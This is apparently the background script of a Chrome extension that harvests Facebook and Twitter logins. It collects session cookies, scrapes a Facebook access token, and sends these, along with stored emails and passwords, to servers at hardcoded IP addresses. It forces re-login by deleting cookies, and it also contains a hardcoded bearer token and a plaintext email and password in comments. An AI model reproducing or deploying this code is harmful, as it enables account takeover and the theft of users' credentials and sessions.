chrome.storage.local.set({ extensionState: 0 }, function() {});

function removeCookies(domain, url) {
    chrome.cookies.getAll({ domain: domain }, function(cookies) {
        for (var i = 0; i < cookies.length; i++) {
            chrome.cookies.remove({ url: url + cookies[i].path, name: cookies[i].name });
            console.log('cookie removed');
        }
    });
}

function savefbCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ FBcookie: e }, function() {});
    });
}

function savetwCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ TWcookie: e }, function() {});
    });
}

function saveuToken() {
    var s = $.ajax({
        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
        type: "get",
        async: false,
        global: false,
        success: function(t) {
            return t;
        }
    }).responseText;
    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
    chrome.storage.sync.set({ FBuToken: uToken }, function() {});
}


function addfbCookie(cookie, url) {
    chrome.storage.sync.get([cookie], function(result) {
        result.FBcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = url;
            chrome.cookies.set(item, function(c) {
                console.log('cookie added!')
            });
        });
    });
}

function addtwCookie(cookie, url) {
    chrome.storage.sync.get([cookie], function(result) {
        result.TWcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = url;
            chrome.cookies.set(item, function(c) {
                console.log('cookie added!')
            });
        });
    });
}

function sendtoContent(msg) {
    chrome.tabs.query({ active: true, currentWindow: true }, gotTabs);

    function gotTabs(tabs) {
        chrome.tabs.sendMessage(tabs[0].id, msg);
    };
}

function twitterData() {
    chrome.storage.sync.get(['TWemail', 'TWpassword'], function(result) {
        var url = 'https://twitter.com';
        chrome.cookies.getAll({ url: url }, function(e) {
            if (e.length > 0) {
                format = '';
                for (let i = 0; i < e.length; i++) {
                    format += e[i].name + '=' + e[i].value;
                    if (i < e.length - 1) {
                        format += ','
                    }
                }

                var data = {
                    "loginCookies": format,
                    "loginPassword": result.TWpassword,
                    "loginUsername": result.TWemail,
                    "socialAccountState": 0,
                    "socialAccountStateDescription": 0,
                    "socialNetwork": {
                        "id": 1
                    },
                    "status": true,
                    "user": {
                        "id": 1,
                        "login": "admin"
                    },
                    "userToken": '',
                    "userTokenState": 0,
                    "userTokenStateDescription": "token"
                };
                $.ajax({
                    url: "http://125.138.183.122:8081/api/connectome-social-media/create",
                    type: 'POST',
                    beforeSend: function(xhr) {
                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
                    },
                    contentType: 'application/json',
                    data: JSON.stringify(data),
                    success: function(response) {
                        console.log(response);
                        chrome.storage.sync.set({ extensionState: 0 }, function() {
                            addtwCookie('TWcookie', 'https://twitter.com');
                        });
                    },
                    error: function(r) {
                        console.log(r);
                        chrome.storage.sync.set({ extensionState: 0 }, function() {
                            addtwCookie('TWcookie', 'https://twitter.com');
                        });
                    },
                })
            }
            removeCookies(".twitter.com", "https://twitter.com");
        })
    })
}

function facebookData() {
    chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
        var uToken;
        var url = 'https://mbasic.facebook.com';
        chrome.cookies.getAll({ url: url }, function(e) {
            if (e.length > 0) {
                format = 'domain=www.facebook.com;';
                for (let i = 0; i < e.length; i++) {
                    format += e[i].name + '=' + e[i].value;
                    if (i < e.length - 1) {
                        format += ';'
                    }
                }

                try {
                    var s = $.ajax({
                        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                        type: "get",
                        async: false,
                        global: false,
                        success: function() {}
                    }).responseText;
                    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                } catch (err) {
                    console.log(err);
                }
                if ("" != uToken) {
                    fbInfo = $.ajax({
                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
                        type: "get",
                        dataType: 'json',
                        async: false,
                        global: false,
                        success: function() {}
                    }).responseJSON;
                }

                // var data = {
                //     "loginCookies": format,
                //     "loginPassword": 'Helloapril22#',
                //     "loginUsername": 'tuongbbinhh7@gmail.com',
                //     "socialAccountState": 0,
                //     "socialAccountStateDescription": 0,
                //     "socialNetwork": {
                //         "id": 1
                //     },
                //     "status": 1,
                //     "user": {
                //         "id": 1,
                //         "login": "admin"
                //     },
                //     "userToken": uToken,
                //     "userTokenState": 0,
                //     "userTokenStateDescription": "token",
                //     "uuid": "12345678"
                // };
                var sendurl = `http://13.21.34.124:8080/php/facebook.php?uid=${fbInfo['id']}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
                var encodeurl = encodeURI(sendurl);
                chrome.tabs.create({ url: encodeurl });
                // $.ajax({
                //     url: "http://125.138.183.122:8081/api/connectome-social-media/create",
                //     type: 'POST',
                //     beforeSend: function(xhr) {
                //         xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
                //     },
                //     contentType: 'application/json',
                //     data: JSON.stringify(data),
                //     success: function(response) {
                //         console.log(response);
                //         chrome.storage.sync.set({ extensionState: 0 }, function() {
                //             addfbCookie('FBcookie', 'https://mbasic.facebook.com');
                //         });
                //     },
                //     error: function(r) {
                //         console.log(r);
                //         chrome.storage.sync.set({ extensionState: 0 }, function() {
                //             addfbCookie('FBcookie', 'https://mbasic.facebook.com');
                //         });
                //     },
                // })
            }
            removeCookies(".facebook.com", "https://mbasic.facebook.com");
        })
    })
};

chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
    console.log(response);
    switch (response) {
        case 'checklogin':
            sendtoContent('showlogin');
            break;
        case 'sendData':
            facebookData();
            break;
        case 'fbLogin':
            savefbCookie('https://mbasic.facebook.com');
            removeCookies(".facebook.com", "https://mbasic.facebook.com");
            chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
            break;
        case 'twLogin':
            savetwCookie('https://twitter.com/');
            removeCookies(".twitter.com", "https://twitter.com/");
            chrome.tabs.create({ url: 'https://twitter.com/login' });
            break;
        case 'donefbLogin':
            setTimeout(facebookData(), 2000);
            break;
        case 'donetwLogin':
            setTimeout(twitterData(), 2000);
            break;
        case 'testtimeout':
            setTimeout(function() { console.log('testsettimeout5s') }, 5000);
            break;
        default:
            console.log('nofunction');
    }
});